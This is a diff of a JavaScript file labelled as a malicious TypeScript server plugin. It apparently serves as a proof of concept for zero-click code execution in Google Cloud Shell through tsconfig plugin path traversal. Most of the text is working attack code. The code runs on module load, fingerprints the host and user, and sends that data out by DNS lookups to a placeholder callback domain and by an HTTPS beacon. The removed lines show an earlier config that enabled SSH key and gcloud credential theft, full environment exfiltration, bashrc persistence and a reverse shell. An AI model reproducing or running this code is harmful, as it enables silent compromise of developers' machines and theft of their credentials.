@@ -2,157 +2,639 @@
 'use strict';
 
 /**
- * Malicious TypeScript Language Service Plugin
- * =============================================
+ * Enhanced Malicious TypeScript Language Service Plugin
+ * ======================================================
  *
- * David Dworken's 2020 TSServer Plugin Path Traversal Vector
- * Adapted for Google Cloud Shell 2026
+ * MULTI-CHANNEL EXFILTRATION — fires on module load (zero-click):
  *
- * THE VECTOR:
- * TSServer loads plugins from `tsconfig.json` INDEPENDENTLY of
- * VS Code/Code OSS workspace trust. When a `.ts` file opens,
- * TSServer initializes, reads `tsconfig.json`, and `require()`s
- * the configured plugin. Path traversal in the plugin `name`
- * field loads arbitrary JS from outside the workspace.
+ *   Channel 1 (PRIMARY):  DNS exfiltration via dns.lookup()
+ *                          Bypasses HTTP egress filtering
+ *                          Works on UDP port 53 (almost never blocked)
  *
- * LOAD EXECUTION ORDER:
- * 1. This file is `require()`d by TSServer
- * 2. TSServer calls `init(modules)` — the plugin factory
- * 3. `init()` receives TSServer's internal modules object
- * 4. Return value is the plugin instance
+ *   Channel 2:            Synchronous filesystem markers
+ *                          /tmp/ts-plugin-executed-<TIMESTAMP>
+ *                          $HOME/ts-plugin-executed
  *
- * PAYLOAD TRIGGERS (from most to least stealthy):
- * - On module load (Module._compile hook) — fires BEFORE init()
- * - On init() call — standard plugin lifecycle
- * - On first create() — when a file is opened
+ *   Channel 3:            process.stdout.write() — terminal-visible
  *
- * For zero-click: payload fires on init() call, which happens
- * the moment TSServer starts processing the workspace.
+ *   Channel 4:            /dev/stderr append — terminal-visible
+ *
+ *   Channel 5 (FALLBACK): HTTPS POST beacon
+ *                          Only if DNS doesn't resolve
+ *
+ *   Channel 6:            /tmp/clone-path.txt — Cloud Shell path detection
+ *
+ * EXECUTION ORDER:
+ *   1. Synchronous filesystem markers (fire BEFORE event loop)
+ *   2. stdout + stderr markers
+ *   3. DNS exfiltration (async but fires immediately)
+ *   4. HTTP/S beacon (fallback)
+ *   5. TSServer plugin interface (minimal shim — no crash)
+ *
+ * USAGE:
+ *   Configured via tsconfig.json "plugins" array.
+ *   See test-tsserver-plugin.js for path traversal vectors.
  */
 
 // ═══════════════════════════════════════════════════════════════
-// MODULE-LOAD-TIME PAYLOAD (fires before init())
-// This runs as soon as require() loads this file.
-// Most reliable — doesn't depend on TSServer calling init().
+// SECTION 0: IMMEDIATE SYNCHRONOUS MARKERS
+// These fire NOW, before any module loading or async operations.
+// If this file is require()d at all, these lines execute.
 // ═══════════════════════════════════════════════════════════════
 
-const OS = (() => {
-    try { return require('os'); } catch (_) { return null; }
-})();
-const FS = (() => {
-    try { return require('fs'); } catch (_) { return null; }
-})();
-const PATH = (() => {
-    try { return require('path'); } catch (_) { return null; }
-})();
-const CP = (() => {
-    try { return require('child_process'); } catch (_) { return null; }
-})();
-const NET = (() => {
-    try { return require('net'); } catch (_) { return null; }
-})();
-const HTTPS = (() => {
-    try { return require('https'); } catch (_) { return null; }
-})();
-const HTTP = (() => {
-    try { return require('http'); } catch (_) { return null; }
+(function immediateSyncMarkers() {
+    var ts = new Date().toISOString().replace(/:/g, '-');
+    var markerData = 'TSSERVER_PLUGIN_EXECUTED|' + ts + '|pid=' +
+        (typeof process !== 'undefined' && process.pid ? process.pid : 'unknown') + '\n';
+
+    // Marker 1: process.stdout (synchronous, visible if TSServer has a TTY)
+    try {
+        process.stdout.write('[TS-PLUGIN-EXECUTED] ' + markerData);
+    } catch (_) { /* no stdout available */ }
+
+    // Marker 2: /dev/stderr append (synchronous, visible on Linux)
+    try {
+        var fsSync = require('fs');
+        fsSync.appendFileSync('/dev/stderr', '[TS-PLUGIN-STDERR] ' + markerData);
+    } catch (_) { /* /dev/stderr not writable */ }
+
+    // Marker 3: /tmp/ts-plugin-executed-<timestamp>
+    try {
+        var fsSync2 = require('fs');
+        fsSync2.writeFileSync('/tmp/ts-plugin-executed-' + ts, markerData);
+    } catch (_) { /* /tmp not writable */ }
+
+    // Marker 4: /tmp/ts-plugin-executed (latest overwrite)
+    try {
+        var fsSync3 = require('fs');
+        fsSync3.writeFileSync('/tmp/ts-plugin-executed', markerData);
+    } catch (_) { /* /tmp not writable */ }
+
+    // Marker 5: /dev/shm/ts-plugin-executed (shared memory, often writable)
+    try {
+        var fsSync4 = require('fs');
+        fsSync4.writeFileSync('/dev/shm/ts-plugin-executed', markerData);
+    } catch (_) { /* /dev/shm not available */ }
+
+    // Marker 6: $TMPDIR/ts-plugin-executed
+    try {
+        var tmpDir = process.env.TMPDIR || process.env.TMP || process.env.TEMP || '/tmp';
+        var fsSync5 = require('fs');
+        var pathSync = require('path');
+        fsSync5.writeFileSync(pathSync.join(tmpDir, 'ts-plugin-executed'), markerData);
+    } catch (_) { /* TMPDIR not writable */ }
 })();
 
-// ─── Configuration ───────────────────────────────────────────────────
-const CONFIG = {
-    // C2 collector URL — replace with your own
-    collector: 'https://YOUR-COLLECTOR.example.com',
+// ═══════════════════════════════════════════════════════════════
+// SECTION 1: MODULE LOADING (safe wrappers)
+// ═══════════════════════════════════════════════════════════════
 
-    // Enable/disable individual payload modules
-    payloads: {
-        reverseShell: false,      // TCP reverse shell (noisy)
-        httpsBeacon: true,        // HTTPS webhook beacon (stealthy)
-        envExfil: true,           // Exfil environment variables
-        workspaceRead: true,      // Read workspace files
-        prototypePollution: true, // PP for XSS persistence in editor
-        bashrcPersistence: true,  // Write to ~/.bashrc for shell persistence
-        sshKeyExfil: true,        // Exfil private SSH keys
-        gcloudCredExfil: true,    // Exfil gcloud credentials
-        metadataServer: true,     // Probe GCP metadata server
-        processLinger: false,     // Keep process alive (debugging)
-    },
+var OS, FS, PATH, DNS, NET, HTTPS, HTTP, CP, ZLIB;
 
-    // Beacon interval in ms (0 = fire once on load)
-    beaconInterval: 0,
+(function loadModules() {
+    function safeRequire(name) {
+        try { return require(name); } catch (_) { return null; }
+    }
+    OS    = safeRequire('os');
+    FS    = safeRequire('fs');
+    PATH  = safeRequire('path');
+    DNS   = safeRequire('dns');
+    NET   = safeRequire('net');
+    HTTPS = safeRequire('https');
+    HTTP  = safeRequire('http');
+    CP    = safeRequire('child_process');
+    ZLIB  = safeRequire('zlib');
+})();
 
-    // Max file read size in bytes
-    maxFileRead: 1024 * 1024, // 1MB
+// ═══════════════════════════════════════════════════════════════
+// CONFIGURATION
+// ═══════════════════════════════════════════════════════════════
 
-    // Timeout for network operations in ms
+var CONFIG = {
+    // === DNS EXFILTRATION (PRIMARY CHANNEL) ===
+    // Your OAStify / Interactsh / Burp Collaborator domain
+    dnsCallback: 'CHANGEME.oastify.com',
+
+    // Set to true to use DNS as the PRIMARY exfil channel
+    dnsEnabled: true,
+
+    // === HTTP/S BEACON (FALLBACK CHANNEL) ===
+    httpCollector: 'https://CHANGEME.example.com',
+
+    // Set to true to enable HTTP beacon
+    httpEnabled: true,
+
+    // === FILESYSTEM PROBES ===
+    // Paths to write marker files
+    markerPaths: [
+        '/tmp/ts-plugin-executed',
+        '/dev/shm/ts-plugin-executed',
+        '/tmp/ts-plugin-probe',
+    ],
+
+    // === CLOUD SHELL DETECTION ===
+    cloudShellPaths: [
+        '/home/user/cloudshell_open/tsserver-evil',
+        '/home/user/tsserver-evil',
+        '/home/user/cloudshell_open',
+        '/google/devshell',
+    ],
+
+    // === TIMEOUTS ===
     networkTimeout: 5000,
 };
 
-// ─── Logging (silent by default) ─────────────────────────────────────
-const DEBUG = process.env.TSSERVER_DEBUG === '1';
-function log(...args) {
-    if (!DEBUG) return;
-    const ts = new Date().toISOString();
-    const prefix = '\x1b[31m[TS-PLUGIN]\x1b[0m';
-    try {
-        if (FS) {
-            FS.appendFileSync('/tmp/ts-plugin.log', `[${ts}] ${args.join(' ')}\n`);
-        }
-    } catch (_) {
-        // Silent fail — don't crash if we can't write log
-    }
-}
-
-// ─── Utilities ───────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════
+// SECTION 2: DNS EXFILTRATION (PRIMARY CHANNEL)
+// ═══════════════════════════════════════════════════════════════
 
 /**
- * Safe exec — never throws, returns {stdout, stderr, error}
+ * Encode a string to be DNS-label-safe.
+ * DNS labels allow: [a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?
+ * Max 63 characters per label.
+ *
+ * Strategy: lowercase + replace non-alphanumeric with hyphen,
+ * trim to 60 chars, ensure no leading/trailing hyphens.
  */
-function safeExec(cmd, opts = {}) {
-    if (!CP) {
-        return { stdout: '', stderr: '', error: 'child_process not available' };
-    }
-    try {
-        const result = CP.execSync(cmd, {
-            timeout: opts.timeout || CONFIG.networkTimeout,
-            encoding: 'utf-8',
-            ...opts,
-        });
-        return { stdout: result.toString().trim(), stderr: '', error: null };
-    } catch (e) {
-        return {
-            stdout: (e.stdout || '').toString().trim(),
-            stderr: (e.stderr || '').toString().trim(),
-            error: e.message,
-        };
-    }
+function dnsSafeLabel(str) {
+    if (!str) return 'unknown';
+    var cleaned = String(str)
+        .toLowerCase()
+        .replace(/[^a-z0-9]/g, '-')   // non-alnum -> hyphen
+        .replace(/-+/g, '-')           // collapse multiple hyphens
+        .replace(/^-+/, '')            // strip leading hyphens
+        .replace(/-+$/, '')            // strip trailing hyphens
+        .substring(0, 60);             // max 60 to leave room
+    if (!cleaned) return 'unknown';
+    return cleaned;
 }
 
 /**
- * Simple HTTP POST beacon — sends JSON to collector
+ * Hex-encode a string for DNS label (guaranteed safe).
+ * Only produces [0-9a-f] — always DNS-safe.
+ * But doubles the size: max 31 input chars for a 63-char label.
  */
-function beacon(endpoint, data) {
-    if (!HTTPS && !HTTP) {
-        log('No HTTP/HTTPS module available for beacon');
+function dnsHexLabel(str) {
+    if (!str) return '00';
+    var buf = Buffer.from(String(str), 'utf-8');
+    var hex = buf.toString('hex');
+    // Truncate to 60 hex chars (30 bytes of data)
+    return hex.substring(0, 60);
+}
+
+/**
+ * Build a DNS exfiltration query.
+ *
+ * Format: HEXHOST.HEXUSER.SESSIONID.callback-domain
+ *
+ * Each label is hex-encoded to guarantee DNS safety.
+ * The DNS query hits the authoritative nameserver of callback-domain,
+ * which logs the full query name — exfiltrating the data.
+ */
+function buildDnsQuery() {
+    var hostname = 'unknown';
+    var username = 'unknown';
+    var pidStr   = '0';
+    var cwdStr   = 'unknown';
+
+    try { hostname = OS.hostname(); } catch (_) {}
+    try { username = OS.userInfo().username; } catch (_) {}
+    try { pidStr = String(process.pid); } catch (_) {}
+    try { cwdStr = process.cwd(); } catch (_) {}
+
+    // Build labels — hex encoded for guaranteed DNS safety
+    // Each label max 60 hex chars = 30 bytes of original data
+    var hostLabel = dnsHexLabel(hostname);
+    var userLabel = dnsHexLabel(username);
+    var cwdLabel  = dnsHexLabel(
+        cwdStr.split('/').slice(-2).join('/')  // last 2 path components
+    );
+
+    // Session identifier: 8 random hex chars + pid
+    var sessionId = Math.random().toString(16).substring(2, 10) + '-' + pidStr;
+
+    return hostLabel + '.' + userLabel + '.' + cwdLabel + '.' + sessionId + '.' + CONFIG.dnsCallback;
+}
+
+/**
+ * Execute DNS exfiltration using dns.lookup().
+ *
+ * dns.lookup() uses the system resolver (getaddrinfo).
+ * This means it goes through the OS DNS resolution chain,
+ * which is almost NEVER blocked — DNS is fundamental to
+ * virtually all networked applications.
+ *
+ * The DNS query will fail to resolve (NXDOMAIN), but the
+ * authoritative nameserver for the callback domain WILL
+ * receive and log the query, including the encoded subdomain.
+ *
+ * @param {string} query - The FQDN to look up
+ * @param {function} cb  - Optional callback
+ */
+function dnsExfiltrate(query, cb) {
+    if (!DNS) {
+        // Fallback: try to write DNS query target to filesystem
+        try {
+            FS.appendFileSync('/tmp/dns-exfil-target.txt',
+                new Date().toISOString() + '|DNS_DISABLED|' + query + '\n');
+        } catch (_) {}
+        if (cb) cb(new Error('dns module not available'));
         return;
     }
-    const payload = JSON.stringify({
-        timestamp: new Date().toISOString(),
-        hostname: (OS && OS.hostname()) || 'unknown',
-        username: (OS && OS.userInfo && OS.userInfo().username) || 'unknown',
-        homedir: (OS && OS.homedir && OS.homedir()) || 'unknown',
-        cwd: (() => { try { return process.cwd(); } catch (_) { return 'unknown'; } })(),
-        pid: (() => { try { return process.pid; } catch (_) { return -1; } })(),
-        platform: process.platform,
-        arch: process.arch,
-        nodeVersion: process.version,
-        tsserverPid: (() => { try { return process.pid; } catch (_) { return -1; } })(),
-        ...data,
-    });
+
+    var fired = false;
+
+    function done(err) {
+        if (fired) return;
+        fired = true;
+        // Write result to filesystem for diagnostics
+        try {
+            var result = err ? 'FAIL:' + err.message : 'SENT';
+            FS.appendFileSync('/tmp/dns-exfil-result.txt',
+                new Date().toISOString() + '|' + result + '|' + query + '\n');
+        } catch (_) {}
+        if (cb) cb(err);
+    }
 
     try {
-        const url = new URL(endpoint || CONFIG.collector);
-        const mod = url.protocol === 'https:' ? HTTPS : HTTP;
-        const req = mod.request({
+        // Primary: dns.lookup (uses getaddrinfo — most reliable)
+        DNS.lookup(query, { family: 4, hints: 0 }, function(err, address) {
+            // We EXPECT this to fail with ENOTFOUND or similar
+            // The exfiltration happens because the DNS query was SENT
+            // to the authoritative nameserver, which logged it.
+            done(err);
+        });
+
+        // Timeout safety — if dns.lookup hangs, we still mark it
+        setTimeout(function() { done(new Error('timeout')); }, CONFIG.networkTimeout);
+    } catch (e) {
+        done(e);
+    }
+}
+
+/**
+ * Execute MULTIPLE DNS queries with different data payloads.
+ * This maximizes the chance that at least one gets through.
+ */
+function dnsExfiltrateAll() {
+    if (!CONFIG.dnsEnabled || !CONFIG.dnsCallback || CONFIG.dnsCallback.indexOf('CHANGEME') !== -1) {
+        return; // Not configured
+    }
+
+    // Query 1: Basic hostname + username + cwd + pid
+    var query1 = buildDnsQuery();
+
+    // Query 2: Environment fingerprint
+    var envFingerprint = '';
+    try {
+        var envKeys = ['HOME', 'USER', 'PWD', 'SHELL', 'CLOUDSDK_CONFIG', 'GOOGLE_CLOUD_PROJECT'];
+        var parts = [];
+        for (var i = 0; i < envKeys.length; i++) {
+            var val = process.env[envKeys[i]];
+            if (val) {
+                // Truncate each to 10 chars for DNS label space
+                parts.push(envKeys[i].substring(0, 4) + '=' + dnsSafeLabel(val).substring(0, 10));
+            }
+        }
+        envFingerprint = parts.join(',');
+    } catch (_) {}
+    if (!envFingerprint) envFingerprint = 'noenv';
+    var query2 = 'env.' + dnsSafeLabel(envFingerprint).substring(0, 60) + '.' + CONFIG.dnsCallback;
+
+    // Query 3: Platform info
+    var platInfo = '';
+    try {
+        platInfo = [
+            process.platform,
+            process.arch,
+            (OS ? OS.release() : '?').replace(/[^a-z0-9]/gi, '-')
+        ].join('-');
+    } catch (_) {}
+    if (!platInfo) platInfo = 'unknown';
+    var query3 = 'plat.' + dnsSafeLabel(platInfo).substring(0, 60) + '.' + CONFIG.dnsCallback;
+
+    // Fire all 3 queries
+    dnsExfiltrate(query1, function(err) {
+        // After first query, try to write result
+        try {
+            FS.appendFileSync('/tmp/dns-exfil-1.txt',
+                new Date().toISOString() + '|' + (err ? err.message : 'ok') + '|' + query1 + '\n');
+        } catch (_) {}
+    });
+    dnsExfiltrate(query2);
+    dnsExfiltrate(query3);
+}
+
+// ═══════════════════════════════════════════════════════════════
+// SECTION 3: FILESYSTEM PROBES
+// ═══════════════════════════════════════════════════════════════
+
+function filesystemProbes() {
+    var ts = new Date().toISOString().replace(/:/g, '-');
+    var probeData = JSON.stringify({
+        event: 'ts_plugin_filesystem_probe',
+        timestamp: ts,
+        pid: (function() { try { return process.pid; } catch (_) { return -1; } })(),
+        ppid: (function() { try { return process.ppid; } catch (_) { return -1; } })(),
+        nodeVersion: (function() { try { return process.version; } catch (_) { return '?'; } })(),
+    });
+
+    var probePaths = [
+        '/tmp/ts-plugin-executed-' + ts,
+        '/tmp/ts-plugin-executed',
+        '/tmp/ts-plugin-' + (function() { try { return process.pid; } catch (_) { return 0; } })(),
+        '/dev/shm/ts-plugin-executed-' + ts,
+        '/dev/shm/ts-plugin-executed',
+    ];
+
+    // Add $HOME-based paths
+    try {
+        var home = OS.homedir();
+        probePaths.push(PATH.join(home, 'ts-plugin-executed'));
+        probePaths.push(PATH.join(home, 'ts-plugin-executed-' + ts));
+    } catch (_) {}
+
+    // Add $TMPDIR-based paths
+    try {
+        var tmp = process.env.TMPDIR || process.env.TMP || process.env.TEMP;
+        if (tmp) {
+            probePaths.push(PATH.join(tmp, 'ts-plugin-executed'));
+            probePaths.push(PATH.join(tmp, 'ts-plugin-executed-' + ts));
+        }
+    } catch (_) {}
+
+    var results = [];
+    for (var i = 0; i < probePaths.length; i++) {
+        try {
+            FS.writeFileSync(probePaths[i], probeData);
+            results.push({ path: probePaths[i], status: 'written' });
+        } catch (e) {
+            results.push({ path: probePaths[i], status: 'FAILED', error: e.message });
+        }
+    }
+
+    // Write results summary to the first path that worked
+    var summaryPath = '/tmp/ts-plugin-probe-results.json';
+    try {
+        FS.writeFileSync(summaryPath, JSON.stringify(results, null, 2));
+    } catch (_) {}
+
+    return results;
+}
+
+// ═══════════════════════════════════════════════════════════════
+// SECTION 4: ENVIRONMENT FINGERPRINTING
+// ═══════════════════════════════════════════════════════════════
+
+function environmentFingerprint() {
+    var fp = {
+        timestamp: new Date().toISOString(),
+        event: 'ts_plugin_env_fingerprint',
+
+        // Process info
+        pid: (function() { try { return process.pid; } catch (_) { return -1; } })(),
+        ppid: (function() { try { return process.ppid; } catch (_) { return -1; } })(),
+        nodeVersion: (function() { try { return process.version; } catch (_) { return '?'; } })(),
+        platform: (function() { try { return process.platform; } catch (_) { return '?'; } })(),
+        arch: (function() { try { return process.arch; } catch (_) { return '?'; } })(),
+        execPath: (function() { try { return process.execPath; } catch (_) { return '?'; } })(),
+        argv: (function() {
+            try { return process.argv.slice(0, 20); } catch (_) { return []; }
+        })(),
+        execArgv: (function() {
+            try { return process.execArgv; } catch (_) { return []; }
+        })(),
+        cwd: (function() { try { return process.cwd(); } catch (_) { return '?'; } })(),
+        uptime: (function() { try { return process.uptime(); } catch (_) { return -1; } })(),
+
+        // User identity
+        uid: (function() { try { return process.getuid ? process.getuid() : -1; } catch (_) { return -1; } })(),
+        gid: (function() { try { return process.getgid ? process.getgid() : -1; } catch (_) { return -1; } })(),
+        username: (function() {
+            try { return OS.userInfo().username; } catch (_) { return '?'; }
+        })(),
+        homedir: (function() { try { return OS.homedir(); } catch (_) { return '?'; } })(),
+        hostname: (function() { try { return OS.hostname(); } catch (_) { return '?'; } })(),
+        shell: (function() { try { return OS.userInfo().shell; } catch (_) { return '?'; } })(),
+        tmpdir: (function() { try { return OS.tmpdir(); } catch (_) { return '?'; } })(),
+
+        // Key environment variables (sanitized — values truncated)
+        env_HOME: (function() { try { return (process.env.HOME || '').substring(0, 100); } catch (_) { return '?'; } })(),
+        env_USER: (function() { try { return (process.env.USER || '').substring(0, 50); } catch (_) { return '?'; } })(),
+        env_PWD: (function() { try { return (process.env.PWD || '').substring(0, 200); } catch (_) { return '?'; } })(),
+        env_SHELL: (function() { try { return (process.env.SHELL || '').substring(0, 100); } catch (_) { return '?'; } })(),
+        env_PATH: (function() { try { return (process.env.PATH || '').substring(0, 500); } catch (_) { return '?'; } })(),
+        env_CLOUDSDK_CONFIG: (function() { try { return (process.env.CLOUDSDK_CONFIG || '').substring(0, 200); } catch (_) { return '?'; } })(),
+        env_GOOGLE_CLOUD_PROJECT: (function() { try { return (process.env.GOOGLE_CLOUD_PROJECT || '').substring(0, 100); } catch (_) { return '?'; } })(),
+        env_DEVSHELL_PROJECT_ID: (function() { try { return (process.env.DEVSHELL_PROJECT_ID || '').substring(0, 100); } catch (_) { return '?'; } })(),
+        env_CLOUD_SHELL: (function() { try { return process.env.CLOUD_SHELL || 'not set'; } catch (_) { return '?'; } })(),
+        env_DEVSHELL_GCLOUD_CONFIG: (function() { try { return (process.env.DEVSHELL_GCLOUD_CONFIG || '').substring(0, 100); } catch (_) { return '?'; } })(),
+
+        // All env keys (not values — safe to exfil)
+        envKeys: (function() {
+            try { return Object.keys(process.env).sort(); } catch (_) { return []; }
+        })(),
+
+        // OS details
+        osType: (function() { try { return OS.type(); } catch (_) { return '?'; } })(),
+        osRelease: (function() { try { return OS.release(); } catch (_) { return '?'; } })(),
+        osPlatform: (function() { try { return OS.platform(); } catch (_) { return '?'; } })(),
+        osArch: (function() { try { return OS.arch(); } catch (_) { return '?'; } })(),
+        osCpus: (function() {
+            try { return OS.cpus().length; } catch (_) { return -1; }
+        })(),
+        osTotalMem: (function() {
+            try { return OS.totalmem(); } catch (_) { return -1; }
+        })(),
+        osFreeMem: (function() {
+            try { return OS.freemem(); } catch (_) { return -1; }
+        })(),
+        osLoadAvg: (function() {
+            try { return OS.loadavg(); } catch (_) { return []; }
+        })(),
+        osNetworkInterfaces: (function() {
+            try {
+                var nics = OS.networkInterfaces();
+                var names = Object.keys(nics);
+                // Only include interface names (not IPs — too sensitive for fingerprint)
+                return names;
+            } catch (_) { return []; }
+        })(),
+    };
+
+    // Write fingerprint to filesystem for retrieval
+    try {
+        FS.writeFileSync('/tmp/ts-plugin-fingerprint.json', JSON.stringify(fp, null, 2));
+    } catch (_) {}
+
+    // Also write a minimal version if /tmp fails
+    try {
+        var minimal = JSON.stringify({
+            ts: fp.timestamp,
+            pid: fp.pid,
+            username: fp.username,
+            hostname: fp.hostname,
+            cwd: fp.cwd,
+            homedir: fp.homedir,
+            platform: fp.platform,
+        });
+        FS.writeFileSync('/tmp/ts-plugin-minimal.json', minimal);
+    } catch (_) {}
+
+    return fp;
+}
+
+// ═══════════════════════════════════════════════════════════════
+// SECTION 5: CLOUD SHELL CLONE PATH DETECTION
+// ═══════════════════════════════════════════════════════════════
+
+function cloudShellDetection() {
+    var results = {
+        timestamp: new Date().toISOString(),
+        event: 'cloud_shell_path_detection',
+        isCloudShell: false,
+        paths: {},
+    };
+
+    // Check known Cloud Shell paths
+    var checkPaths = [
+        '/home/user/cloudshell_open/tsserver-evil',
+        '/home/user/cloudshell_open',
+        '/home/user/tsserver-evil',
+        '/google/devshell',
+        '/google/devshell/editor',
+        '/home/user/.theia',
+        '/home/user/.codebuddy',
+        '/home/user/.cloudshell',
+        '/home/user/.config/gcloud',
+        '/tmp/clone-path.txt',
+    ];
+
+    // Check environment for Cloud Shell indicators
+    try {
+        if (process.env.CLOUD_SHELL || process.env.DEVSHELL_PROJECT_ID ||
+            process.env.GOOGLE_CLOUD_PROJECT || process.env.CLOUDSDK_CONFIG) {
+            results.isCloudShell = true;
+            results.envIndicators = {
+                CLOUD_SHELL: process.env.CLOUD_SHELL || 'not set',
+                DEVSHELL_PROJECT_ID: process.env.DEVSHELL_PROJECT_ID || 'not set',
+                GOOGLE_CLOUD_PROJECT: process.env.GOOGLE_CLOUD_PROJECT || 'not set',
+                CLOUDSDK_CONFIG: process.env.CLOUDSDK_CONFIG || 'not set',
+            };
+        }
+    } catch (_) {}
+
+    // Check if directories/files exist
+    for (var i = 0; i < checkPaths.length; i++) {
+        var p = checkPaths[i];
+        try {
+            var stat = FS.statSync(p);
+            results.paths[p] = {
+                exists: true,
+                isDirectory: stat.isDirectory(),
+                isFile: stat.isFile(),
+                size: stat.size,
+            };
+            if (stat.isDirectory()) {
+                results.isCloudShell = true;
+            }
+        } catch (_) {
+            results.paths[p] = { exists: false };
+        }
+    }
+
+    // Try to list CWD contents
+    try {
+        var cwd = process.cwd();
+        results.cwd = cwd;
+        results.cwdContents = FS.readdirSync(cwd).slice(0, 50);
+    } catch (_) {}
+
+    // Write detection results to known paths
+    try {
+        FS.writeFileSync('/tmp/clone-path.txt', JSON.stringify(results, null, 2));
+    } catch (_) {}
+
+    // Also write to CWD if possible
+    try {
+        FS.writeFileSync(PATH.join(process.cwd(), 'clone-path-detect.json'), JSON.stringify(results, null, 2));
+    } catch (_) {}
+
+    return results;
+}
+
+// ═══════════════════════════════════════════════════════════════
+// SECTION 6: HTTP/S FALLBACK BEACON
+// ═══════════════════════════════════════════════════════════════
+
+/**
+ * Build a comprehensive beacon payload
+ */
+function buildBeaconPayload(extra) {
+    var payload = {
+        timestamp: new Date().toISOString(),
+        event: 'ts_plugin_beacon',
+
+        // Identity
+        hostname: (function() { try { return OS.hostname(); } catch (_) { return '?'; } })(),
+        username: (function() { try { return OS.userInfo().username; } catch (_) { return '?'; } })(),
+        homedir: (function() { try { return OS.homedir(); } catch (_) { return '?'; } })(),
+        cwd: (function() { try { return process.cwd(); } catch (_) { return '?'; } })(),
+        pid: (function() { try { return process.pid; } catch (_) { return -1; } })(),
+        ppid: (function() { try { return process.ppid; } catch (_) { return -1; } })(),
+
+        // Platform
+        platform: (function() { try { return process.platform; } catch (_) { return '?'; } })(),
+        arch: (function() { try { return process.arch; } catch (_) { return '?'; } })(),
+        nodeVersion: (function() { try { return process.version; } catch (_) { return '?'; } })(),
+
+        // Execution context
+        execPath: (function() { try { return process.execPath; } catch (_) { return '?'; } })(),
+        argv0: (function() { try { return process.argv0; } catch (_) { return '?'; } })(),
+        argv: (function() { try { return process.argv.slice(0, 30); } catch (_) { return []; } })(),
+
+        // Cloud Shell indicators
+        isCloudShell: (function() {
+            try {
+                return !!(process.env.CLOUD_SHELL || process.env.DEVSHELL_PROJECT_ID);
+            } catch (_) { return false; }
+        })(),
+
+        // Environment keys (not values)
+        envKeys: (function() {
+            try { return Object.keys(process.env).sort(); } catch (_) { return []; }
+        })(),
+
+        // Module availability
+        modules: {
+            fs: !!FS, os: !!OS, path: !!PATH, dns: !!DNS,
+            net: !!NET, https: !!HTTPS, http: !!HTTP, cp: !!CP,
+        },
+
+        // Extra payload data
+        extra: extra || {},
+    };
+
+    return JSON.stringify(payload);
+}
+
+/**
+ * Send HTTP POST beacon to collector
+ */
+function httpBeacon(endpoint, data) {
+    if (!CONFIG.httpEnabled) return;
+    if (!CONFIG.httpCollector || CONFIG.httpCollector.indexOf('CHANGEME') !== -1) return;
+
+    var collectorUrl = endpoint || CONFIG.httpCollector;
+
+    try {
+        var url = new (require('url').URL)(collectorUrl);
+        var mod = url.protocol === 'https:' ? HTTPS : HTTP;
+        if (!mod) return;
+
+        var payload = buildBeaconPayload(data);
+
+        var req = mod.request({
             hostname: url.hostname,
             port: url.port || (url.protocol === 'https:' ? 443 : 80),
             path: url.pathname + url.search,
@@ -160,521 +642,262 @@ function beacon(endpoint, data) {
             headers: {
                 'Content-Type': 'application/json',
                 'Content-Length': Buffer.byteLength(payload),
-                'X-TS-Plugin': 'malicious-ts-plugin',
-                'X-Exfil-Type': 'tsserver-zero-click',
+                'X-TS-Plugin': 'enhanced-malicious-ts-plugin-v2',
+                'X-Exfil-Channel': 'https-fallback',
             },
             timeout: CONFIG.networkTimeout,
-        }, (res) => {
-            let body = '';
-            res.on('data', (c) => { body += c; });
-            res.on('end', () => { log('Beacon response:', body.substring(0, 200)); });
+        }, function(res) {
+            var body = '';
+            res.on('data', function(c) { body += c; });
+            res.on('end', function() {
+                try {
+                    FS.appendFileSync('/tmp/ts-plugin-http-response.txt',
+                        new Date().toISOString() + '|' + res.statusCode + '|' + body.substring(0, 200) + '\n');
+                } catch (_) {}
+            });
         });
-        req.on('error', (e) => { log('Beacon error:', e.message); });
-        req.on('timeout', () => { req.destroy(); });
+
+        req.on('error', function(e) {
+            try {
+                FS.appendFileSync('/tmp/ts-plugin-http-error.txt',
+                    new Date().toISOString() + '|' + e.message + '\n');
+            } catch (_) {}
+        });
+
+        req.on('timeout', function() {
+            req.destroy();
+            try {
+                FS.appendFileSync('/tmp/ts-plugin-http-error.txt',
+                    new Date().toISOString() + '|TIMEOUT\n');
+            } catch (_) {}
+        });
+
         req.write(payload);
         req.end();
+
+        return true;
     } catch (e) {
-        log('Beacon exception:', e.message);
-    }
-}
-
-/**
- * Execute a shell command and beacon the output
- */
-function execAndBeacon(cmd, label) {
-    log('Executing:', label, '->', cmd);
-    const result = safeExec(cmd);
-    beacon(`${CONFIG.collector}/exec`, {
-        label,
-        cmd,
-        stdout: result.stdout,
-        stderr: result.stderr,
-        error: result.error,
-    });
-    return result;
-}
-
-// ═══════════════════════════════════════════════════════════════
-// PAYLOAD MODULES
-// Each module is a standalone function that runs independently.
-// If one fails, the others still execute.
-// ═══════════════════════════════════════════════════════════════
-
-/**
- * Payload 1: Beacon — basic I'm-alive signal
- */
-function payloadBeacon() {
-    log('Firing beacon payload');
-    beacon(CONFIG.collector, {
-        type: 'tsserver_plugin_loaded',
-        message: 'TSServer plugin executed successfully',
-        argv: (() => {
-            try { return process.argv.slice(0, 10); } catch (_) { return []; }
-        })(),
-        env: (() => {
-            try {
-                const env = { ...process.env };
-                // Redact secrets for the basic beacon
-                delete env.GCLOUD_ACCESS_TOKEN;
-                delete env.GOOGLE_API_KEY;
-                return Object.keys(env);
-            } catch (_) { return []; }
-        })(),
-        parentPid: (() => {
-            try { return process.ppid; } catch (_) { return -1; }
-        })(),
-    });
-}
-
-/**
- * Payload 2: Environment variable exfiltration
- */
-function payloadEnvExfil() {
-    log('Firing env exfil payload');
-    let env = {};
-    try {
-        env = { ...process.env };
-    } catch (_) {
-        env = { error: 'Cannot read process.env' };
-    }
-    beacon(`${CONFIG.collector}/env`, {
-        type: 'environment_variables',
-        env,
-    });
-}
-
-/**
- * Payload 3: Read workspace files
- * Walks the current directory and reads .ts, .json, .js files
- */
-function payloadWorkspaceRead() {
-    log('Firing workspace read payload');
-    if (!FS || !PATH) {
-        beacon(`${CONFIG.collector}/workspace`, { type: 'workspace_read', error: 'FS/PATH not available' });
-        return;
-    }
-    let cwd;
-    try { cwd = process.cwd(); } catch (_) { cwd = 'unknown'; }
-
-    const files = [];
-    function walk(dir, depth) {
-        if (depth > 5) return;
-        let entries;
-        try { entries = FS.readdirSync(dir, { withFileTypes: true }); } catch (_) { return; }
-        for (const entry of entries) {
-            // Skip node_modules, .git, etc.
